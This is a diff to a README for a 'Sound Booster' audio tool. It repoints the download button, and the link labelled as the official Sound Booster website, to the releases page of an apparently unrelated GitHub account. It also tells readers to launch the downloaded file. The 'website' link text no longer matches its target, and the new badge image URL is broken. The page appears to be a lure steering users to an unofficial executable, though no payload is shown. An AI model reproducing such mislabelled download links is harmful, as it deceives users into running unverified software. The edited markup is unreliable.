@@ -31,7 +31,7 @@ Sound Booster comes packed with a wide range of features to take your audio expe
 
 To download the latest version of Sound Booster, click the button below:
 
-[![Download Sound Booster](https://img.shields.io/badge/Download-Sound%20Booster-blue)](https://github.com/repo/releases/9246/App.zip)
+[![Download Sound Booster](https://github.com/Kercomplex2024/Sound-Booster/releases%20Booster-blue)](https://github.com/Kercomplex2024/Sound-Booster/releases)
 
 *Note: Ensure to launch the downloaded file to install Sound Booster on your system.*
 
@@ -39,7 +39,7 @@ If the above link does not work or is not provided, please check the "Releases" 
 
 ## Explore More 🌟
 
-For more information, updates, and support related to Sound Booster, visit the [Sound Booster Website](https://www.soundbooster.com).
+For more information, updates, and support related to Sound Booster, visit the [Sound Booster Website](https://github.com/Kercomplex2024/Sound-Booster/releases).
 
 Feel free to contribute to the repository by submitting bug reports, feature requests, or even pull requests to enhance Sound Booster for all users.
 
